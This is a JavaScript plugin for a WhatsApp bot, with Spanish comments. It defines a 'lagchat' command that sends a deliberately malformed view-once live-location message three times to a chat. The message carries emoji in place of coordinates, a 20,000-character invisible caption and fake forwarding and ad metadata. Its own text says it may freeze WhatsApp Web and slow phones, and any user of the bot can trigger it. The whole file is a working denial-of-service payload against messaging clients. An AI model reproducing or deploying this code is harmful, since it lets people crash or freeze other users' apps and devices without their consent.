const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(20000) + '💥'.repeat(500), // más invisibles y más emojis
        sequenceNumber: String(Math.floor(Math.random() * 100000)),
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag Extremo',
            body: 'Mensaje pesadísimo',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 3 // más envíos para prolongar el lag

  await m.reply(`⚠️ Enviando ${times} bombas al chat...\nEsto puede congelar WhatsApp Web y móviles lentos.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 200))
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
      await m.reply('❗ Ocurrió un error al enviar el mensaje.')
      return
    }
  }

  await m.reply('✅ *Lagchat completo.*')
}

handler.command = /^lagchat$/i
handler.owner = false


export default handler